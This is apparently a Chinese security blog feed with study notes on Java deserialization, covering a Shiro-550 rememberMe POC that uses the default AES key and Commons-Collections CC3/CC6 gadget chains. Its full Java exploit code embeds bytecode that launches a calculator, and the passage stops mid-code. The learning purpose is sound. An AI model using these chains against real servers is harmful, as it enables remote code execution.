class="hljs-string">&quot;AAgACQACAAoAAAA3AAIAAQAAAAm7AAFZtwACV7EAAAACAAsAAAAKAAIAAAANAAgADgAMAAAADAAB&quot;</span> +<br>                <span class="hljs-string">&quot;AAAACQANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAQAACAAEAAAAOKrcAA7gABBIFtgAGV7EA&quot;</span> +<br>                <span class="hljs-string">&quot;AAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4AEwAUAAAADwAAAAQAAQAQAAEAFQAW&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAWAAwAAAAgAAMAAAABABMAFAAAAAAAAQAX&quot;</span> +<br>                <span class="hljs-string">&quot;ABgAAQAAAAEAGQAaAAIADwAAAAQAAQAbAAEAFQAcAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAG&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAAAAbAAwAAAAqAAQAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAHQAeAAIAAAABAB8AIAADAA8A&quot;</span> +<br>                <span class="hljs-string">&quot;AAAEAAEAGwABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer transformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);<br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>));<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.clear();<br><br>        setFieldValue(outerMap,<span class="hljs-string">&quot;factory&quot;</span>, transformer);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        ByteSource payload = aes.encrypt(bytes, key);<br>        System.out.println(payload.toString());<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116001116904.png" alt="image-20211116001116904"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116001047051.png" alt="image-20211116001047051"></p><p>对于 POC 还是需要去理解这几个方法的原理</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>P神的方法链中使用了 javassist 直接加载class文件，就不用再中途获取一遍 base64 编码。这个链子主要就是结合了一下 CC6 和 CC3，然后修改了调用方法不使用数组的方法了</p><p>P神留下的几个注意点：</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116001835882.png" alt="image-20211116001835882"></p><p>参考文章</p><p>P神代码审计</p><p><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p><p><a href="http://wjlshare.com/archives/1542">http://wjlshare.com/archives/1542</a></p><p><a href="https://0range228.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://0range228.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p><a href="https://www.sec-in.com/article/999">https://www.sec-in.com/article/999</a></p><p><a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a></p><p><a href="http://wh1sper.com/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/">http://wh1sper.com/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Shiro-550-反序列化漏洞&quot;&gt;&lt;a href=&quot;#Shiro-550-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;Shiro 550 反序列化漏洞&quot;&gt;&lt;/a&gt;Shiro 550 反序列化漏洞&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC3</title>
    <link href="http://example.com/2021/11/16/Java-CC3/"/>
    <id>http://example.com/2021/11/16/Java-CC3/</id>
    <published>2021-11-15T16:27:57.000Z</published>
    <updated>2021-11-15T16:29:29.657Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-CC3"><a href="#Java-CC3" class="headerlink" title="Java CC3"></a>Java CC3</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>看了P神的代码审计，大致看了一遍，发现 CC3 可以粗略的理解为 CC1 加上 <code>TemplatesTmpl</code>加载字节码，所以赶紧回去复习一下。</p><p><a href="http://lcdm123.xyz/2021/11/07/Java-CC/">http://lcdm123.xyz/2021/11/07/Java-CC/</a></p><p><a href="http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</a></p><p>字节码对应的类必须是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类</p><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>这里直接将CC1 与 <code>TemplatesTmpl</code>中的代码简单结合一下，运行测试</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111001023097.png" alt="image-20211111001023097"></p><p>但是在 CC3 的链中并没有使用到<code>InvokeTransformer</code>，这是因为在反序列化爆出来之后，一些Java 反序列化过滤器将它拦截了，例如：<a href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a></p><h2 id="升级demo"><a href="#升级demo" class="headerlink" title="升级demo"></a>升级demo</h2><p>CommonsCollections3 的目的就是为了绕过一些规则对<code>InvokerTransformer</code>的限制，这里选择利用的是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111002740283.png" alt="image-20211111002740283"></p><p>这个类的构造方法中使用了<code>(TransformerImpl)templates.newTransformer()</code> 这样我们就可避免使用<code>InvokerTransformer</code>来手工调用<code>newTransformer()</code></p><p>那么现在的问题就是如何调用<code>TrAXFilter</code>的构造方法，能直接new对象吗？？ 这里选择的方法就是<code> org.apache.commons.collections.functors.InstantiateTransformer</code>，它也实现了一个<code>Transformer</code>接口通过反射来调用构造方法。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111003627512.png" alt="image-20211111003627512"></p><p>绕过了<code>InvokerTransformer</code>加载字节码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111004610107.png" alt="image-20211111004610107"></p><blockquote><p>一个注意的小点就是这里使用的 <code>Templates.class</code> 刚好对应了<code>TrAXFilter</code>的构造方法</p></blockquote><h3 id="Ysoserial中的写法"><a href="#Ysoserial中的写法" class="headerlink" title="Ysoserial中的写法"></a>Ysoserial中的写法</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111005612455.png" alt="image-20211111005612455"></p><p>这个里面还是使用的 CC1中的<code>LazyMap</code>，并且利用代理机制调用了<code>invoke</code></p><p>这里直接模仿 Ysoserial 的方法写一个简易的POC</p><h3 id="根据CC1写POC"><a href="#根据CC1写POC" class="headerlink" title="根据CC1写POC"></a>根据CC1写POC</h3><p>测试的时候发现一个问题，在Java7中使用<code>TemplatesImpl</code>类加载字节码的时候会报错，但是在Java8中测试正常</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111220813349.png" alt="image-20211111220813349"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111220917179.png" alt="image-20211111220917179"></p><p>这里就导致了我利用<code>TransformerMap</code>构造链子的时候爆出了错误，对比一下两个版本类的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformerMapCC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException </span>&#123;<br>        BASE64Decoder decoder = <span class="hljs-keyword">new</span> BASE64Decoder();<br>        <span class="hljs-keyword">byte</span>[] bytes = decoder.decodeBuffer(<span class="hljs-string">&quot;yv66vgAAADQAMAoABgAiCgAjACQIACUKACMAJgcAJwcAKAEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAVTG9yZy9sY2Rt&quot;</span> +<br>                <span class="hljs-string">&quot;MTIzL1BheWxvYWQ7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVy&quot;</span> +<br>                <span class="hljs-string">&quot;bmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACkBAKYo&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRl&quot;</span> +<br>                <span class="hljs-string">&quot;cmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJh&quot;</span> +<br>                <span class="hljs-string">&quot;dG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxp&quot;</span> +<br>                <span class="hljs-string">&quot;emVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylW&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYHACoBAApTb3VyY2VG&quot;</span> +<br>                <span class="hljs-string">&quot;aWxlAQAMUGF5bG9hZC5qYXZhDAAdAB4HACsMACwALQEAEGdub21lLWNhbGN1bGF0b3IMAC4ALwEA&quot;</span> +<br>                <span class="hljs-string">&quot;E29yZy9sY2RtMTIzL1BheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwv&quot;</span> +<br>                <span class="hljs-string">&quot;eHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEA&quot;</span> +<br>                <span class="hljs-string">&quot;EWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEA&quot;</span> +<br>                <span class="hljs-string">&quot;BGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAQAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAAN&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAAYAAQAAABQACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;FwAYAAMAEgAAAAQAAQATAAkAGQAaAAEACQAAACsAAAABAAAAAbEAAAACAAoAAAAGAAEAAAAYAAsA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAMAAEAAAABABsAHAAAAAEAHQAeAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAK&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAHwABACAAAAACACE=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldName(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldName(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        setFieldName(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        inerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;lcdm&quot;</span>);<br>        Map outerMap = TransformedMap.decorate(inerMap, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object obj = construct.newInstance(Retention.class, outerMap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldName</span><span class="hljs-params">(Object obj, String Fieldname, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(Fieldname);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>应该是java版本的问题这里的代码并没有执行成功，但是我感觉代码没有错误，这里是java 版本的问题</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211112233412106.png" alt="image-20211112233412106"></p><h3 id="CC6结合后的POC"><a href="#CC6结合后的POC" class="headerlink" title="CC6结合后的POC"></a>CC6结合后的POC</h3><p>相比于 CC1 改造的链子，这个比较通用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6ToCC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMAoABgAiCgAjACQIACUKACMAJgcAJwcAKAEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAVTG9yZy9sY2Rt&quot;</span> +<br>                <span class="hljs-string">&quot;MTIzL1BheWxvYWQ7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVy&quot;</span> +<br>                <span class="hljs-string">&quot;bmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACkBAKYo&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRl&quot;</span> +<br>                <span class="hljs-string">&quot;cmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJh&quot;</span> +<br>                <span class="hljs-string">&quot;dG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxp&quot;</span> +<br>                <span class="hljs-string">&quot;emVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylW&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYHACoBAApTb3VyY2VG&quot;</span> +<br>                <span class="hljs-string">&quot;aWxlAQAMUGF5bG9hZC5qYXZhDAAdAB4HACsMACwALQEAEGdub21lLWNhbGN1bGF0b3IMAC4ALwEA&quot;</span> +<br>                <span class="hljs-string">&quot;E29yZy9sY2RtMTIzL1BheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwv&quot;</span> +<br>                <span class="hljs-string">&quot;eHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEA&quot;</span> +<br>                <span 